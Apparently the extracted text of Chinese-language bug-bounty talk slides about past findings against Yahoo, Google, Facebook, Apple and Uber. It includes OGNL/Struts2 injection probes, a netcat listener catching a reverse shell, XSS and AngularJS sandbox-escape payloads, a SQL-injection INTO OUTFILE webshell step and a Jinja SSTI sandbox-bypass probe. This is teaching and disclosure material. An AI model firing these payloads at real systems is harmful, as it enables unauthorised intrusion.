developer.apple.com 被骇案例
• 被 Yahoo Bug Bounty 事件烧到, 感觉很好玩
• 依然是 Google hacking
site:yahoo.com ext:action
b.login.yahoo.com
看起来 s2-016 work 但看起来有 WAF
三个月的空窗期 !
第一次 OGNL 就上手 !
天下武功唯快不破
Yahoo Login Site RCE
• 绕过 WAF
如何判断关键字?
redirect:${12*21}
# /login/252
redirect:${#c=1}
# /login/
redirect:${#c=1,1}
# /login/1
redirect:${#c=1,#d=new chra[10]}
# /login/
redirect:${#c=1,#d=new chra[10],1}
# /login/
天下武功唯快不破
Yahoo Login Site RCE
orange@z:~$ nc –vvl 12345
Connection from 209.73.163.226 port 12345 [tcp/italk] accepted
Linux ac4-laptui-006.adx.ac4.yahoo.com 2.6.18-308.8.2.el5.YAHOO.20120614 #1 SMP Thu
Jun 14 13:27:27 PDT 2012 x86_64 x86_64 x86_64 GNU/Linux 
orange@z:~$
天下武功唯快不破
Yahoo Login Site RCE
天下武功唯快不破
Yahoo Login Site RCE
orange@z:~$ nc –vvl 12345
Connection from 209.73.163.226 port 12345 [tcp/italk] accepted
Linux ac4-laptui-006.adx.ac4.yahoo.com 2.6.18-308.8.2.el5.YAHOO.20120614 #1 SMP Thu
Jun 14 13:27:27 PDT 2012 x86_64 x86_64 x86_64 GNU/Linux 
orange@z:~$
寻找漏洞的思路
• 有做功课的 Bonus
• 天下武功唯快不破
• 认命做苦工活QQ
• 平行权限与逻辑问题
• 少见姿势与神思路
• 用 Google Hacking 黑 Google
site:www.google.com -adwords -finance...
www.google.com/trends/correlate/js/correlate.js
goog$exportSymbol("showEdit", function(src_url) {
...
var html = (new goog$html$SafeHtml).
initSecurityPrivateDoNotAccessOrElse_('
Loading...');
...
}
认命做苦工活QQ
www.google.com XSS
• 如何控制?
id:PaHT-seSlg9
200 OK
id:not_exists
500 Error
id:PaHT-seSlg9:foobar
200 OK
www.google.com/trends/correlate/search
?e=id:PaHT-seSlg9
&t=weekly
认命做苦工活QQ
www.google.com XSS
• 看起来有过滤? 但别忘了它在 JavaScript 内
HTML Entities?
16 进位?
8  进位?
www.google.com/trends/correlate/search
?e=id:PaHT-seSlg9:'">
认命做苦工活QQ
www.google.com XSS
...?
www.google.com/trends/correlate/search
?e=id:8N9IFMOltyp:\x22onload\x3d\x22alert(document.domain)//
&t=weekly
认命做苦工活QQ
www.google.com XSS
认命做苦工活QQ
www.google.com XSS
• 看起来是个 Dom-Based 的 SELF-XSS 需要使用者互动 ?
收的机率一半一半, 需要找到更合理的情境说服 Google
• 继续往下挖掘!
跟 Click Jacking 的组合技?
将要点击的地方制成 IFRMAE 放在滑鼠下随著滑鼠移动
认命做苦工活QQ
www.google.com XSS
认命做苦工活QQ
www.google.com XSS
• https://youtu.be/ESj7PyQ-nv0
认命做苦工活QQ
www.google.com XSS
• https://youtu.be/ESj7PyQ-nv0
认命做苦工活QQ
Facebook Remote Code Execution
• 反向 facebook.com 的 Whois 结果
thefacebook.com
tfbnw.net
fb.com
• 列举 vpn.tfbnw.net 网段
vpn.tfbnw.net
files.fb.com
www.facebooksuppliers.com
认命做苦工活QQ
Facebook Remote Code Execution
• 从过往纪录感觉打得进
拿到 VM
解 ionCube
剩下就是你们的事了
• 拿 Shell
OR 1=1 LIMIT 1 INTO OUTFILE '...' LINES TERMINTATED by 
0x3c3f... #
• 拿 Root
有新功能要上怎么办?
给用户一个更新按钮
不想重造轮子有什么现有的更新方案?
Yum install
Yum install 权限不够怎么办?
加 Sudoers
网页执行要输入密码怎么办?
加 NOPASSWD
认命做苦工活QQ
Facebook Remote Code Execution
认命做苦工活QQ
Facebook Remote Code Execution
认命做苦工活QQ
Facebook Remote Code Execution
寻找漏洞的思路
• 有做功课的 Bonus
• 天下武功唯快不破
• 认命做苦工活QQ
• 平行权限与逻辑问题
• 少见姿势与神思路
• Google Hacking
site:*.apple.com –www -developer -...
http://lookup-api.apple.com/wikipedia.org/
平行权限与逻辑问题
Apple XSS
• lookup-api.apple.com/wikipedia.org
# ok
• lookup-api.apple.com/orange.tw
# failed
• lookup-api.apple.com/en.wikipedia.org
# ok
• lookup-api.apple.com/ja.Wikipedia.org
# ok
平行权限与逻辑问题
Apple XSS
• 难道这段扣错了吗?
if (preg_match("/.wikipedia.org$/", $parsed_url['host']))
// do proxy
else
// goto fail
平行权限与逻辑问题
Apple XSS
花 NT$720 有个 XSS
好像不赖XD
平行权限与逻辑问题
Apple XSS
平行权限与逻辑问题
Apple XSS
寻找漏洞的思路
• 有做功课的 Bonus
• 天下武功唯快不破
• 认命做苦工活QQ
• 平行权限与逻辑问题
• 少见姿势与神思路
少见姿势与神思路
• 针对架构的了解
• 非主流的漏洞, 越少人知道的东西越有搞头
• 思路的培养
CTF (Capture the Flag)
其他奖金猎人的 Write Ups
对新技术的追逐
跨界
少见姿势与神思路
Apple RCE, 第一次进入 Apple 内网
• 忘记密码 -> 在某个找回密码流程中出现的页面
http://abs.apple.com/ssurvey/thankyou.action
• 那时网路意识不高
Jboss, Tomcat, WebObjects 爱用者
扫到一堆 /CVS/
少见姿势与神思路
Apple RCE, 第一次进入 Apple 内网
• Struts2 漏洞在 2012 年根本没啥人知道
• Google Trend of Struts2
?
?
Apple RCE
少见姿势与神思路
Apple RCE, 第一次进入 Apple 内网
少见姿势与神思路
Apple RCE, 第一次进入 Apple 内网
发现的经典模式
发现的经典模式是：
“你寻找你知道的东西（比如到达印度的新方法）
结果发现了一个你不知道的东西（美洲）”
• 扫 OO 厂商范围时发现一个 IP
怎么判断 IP 是不是属于 OO 厂商? 看凭证
• 进去发现是某国外大厂写的 OO 系统
Struts2 撰写
Full Updated
No more s2-0xx
少见姿势与神思路
某大厂商 XSS 0-Day 发现经过
• 思路:
Struts2 撰写 action 都需继承 ActionSupport
因此要判断一个网站是不是 Struts2 所撰写只要在尾巴加
个 ?actionErrors=1 即可
/whatever.action?actionErrors=
public void setActionErrors(Collection errorMessages) {
validationAware.setActionErrors(errorMessages);
}
少见姿势与神思路
某大厂商 XSS 0-Day 发现经过
少见姿势与神思路
某大厂商 XSS 0-Day 发现经过
• 思路:
Struts2 撰写 action 都需继承 ActionSupport
因此要判断一个网站是不是 Struts2 所撰写只要在尾巴加
个 ?actionErrors=1 即可
/whatever.action?actionErrors=
public void setActionErrors(Collection errorMessages) {
validationAware.setActionErrors(errorMessages);
}
One more things...
如果被过滤怎么办?
Thanks for AngularJS
{{'a'.constructor.prototype.charAt=[].join;
$eval('x=1} } };alert(1)//');}}
• Template 相关攻击手法是近几年比较夯的东西, 但较少人关注
Client Side Template Injection
Server Side Template Injection
• Uber 在自身技术部落格有提到产品技术细节
主要是 NodeJS 与 Flask
少了做指纹辨识的时间
少见姿势与神思路
Uber SSTI RCE
• riders.uber.com
修改姓名使用等到寄信通知帐号变更
Cheng Da{{ 1+1 }}
少见姿势与神思路
Uber SSTI RCE
• Python S andbox Bypass
{{ [].__class__.__base__.__subclasses__() }}
Hi, [, , 
, , 
, , 
..., , ...
..., , ... ]
• Asynchronous Task
Template( "Hi, %s ..." % get_name_from_db() )
少见姿势与神思路
Uber SSTI RCE
少见姿势与神思路
Uber SSTI RCE
• Python S andbox Bypass
{{ [].__class__.__base__.__subclasses__() }}
Hi, [, , 
, , 
, , 
..., , ...
..., , ... ]
• Asynchronous Task
Template( "Hi, %s ..." % get_name_from_db() )
结语
• 一起成为奖金猎人吧 !
• 勿骄矜自满, 勿忘初衷
• Organizing Your Know-How, Building Your Own Tool
阅读资源
Google Bughunter University
Bugcrowd
List Of Bug Bounty Programs
Hackerone
Hacktivity
Xsses.com
Facebook Bug Bounties by @phwd
Wooyun.org
Thank you
PI:EMAIL
blog.orange.tw